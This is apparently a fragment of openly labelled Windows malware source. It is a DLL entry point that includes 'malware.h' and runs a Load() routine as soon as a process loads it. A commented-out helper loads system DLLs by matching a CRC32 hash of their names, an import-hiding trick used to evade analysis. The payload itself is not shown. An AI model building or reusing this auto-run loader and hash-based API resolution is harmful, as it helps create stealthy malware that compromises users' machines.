#include <Windows.h>
#include <iostream>

#include "../dll/source/headers/malware.h"

BOOL WINAPI DllMain(
    HINSTANCE hModule,  // Handle to DLL module
    DWORD fdwReason,    // Reason for calling function
    LPVOID lpvReserved) // Reserved
{

    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        Load();
        // DLL is being loaded
        // Initialization code here
        break;

    case DLL_PROCESS_DETACH:
        // DLL is being unloaded
        // Cleanup code here
        break;

    case DLL_THREAD_ATTACH:
        // A new thread is being created in the process
        // Per-thread initialization code here
        break;

    case DLL_THREAD_DETACH:
        // A thread is exiting cleanly
        // Per-thread cleanup code here
        break;
    }

    // Return TRUE to indicate successful initialization or termination
    return TRUE;
}



//
//HMODULE LoadLibraryByHash(DWORD Hash) {
//	LPWSTR SystemDirectory;
//	WIN32_FIND_DATAW Data;
//	HANDLE File;
//	DWORD CurrentHash;
//	HMODULE Module;
//
//	if ((SystemDirectory = GetSystem32()) == NULL)
//		return 0;
//
//	if (!StringConcatW(&SystemDirectory, L"\\*.dll"))
//		return 0;
//
//	Module = 0;
//
//	MemoryZero(&Data, sizeof(WIN32_FIND_DATAW));
//
//	if ((File = API(FindFirstFileW(SystemDirectory, &Data))) != INVALID_HANDLE_VALUE)
//	{
//		while (TRUE)
//		{
//			if (!API(FindNextFileW(File, &Data)))
//				break;
//
//			if (File == INVALID_HANDLE_VALUE)
//				break;
//
//			CurrentHash = Crc32Hash(Data.cFileName, StringLengthW(Data.cFileName) * 2);
//
//			if (CurrentHash == Hash)
//			{
//				Module = API(LoadLibraryW(Data.cFileName));
//				break;
//			}
//		}
//	}
//
//	Free(SystemDirectory);
//	return Module;
//}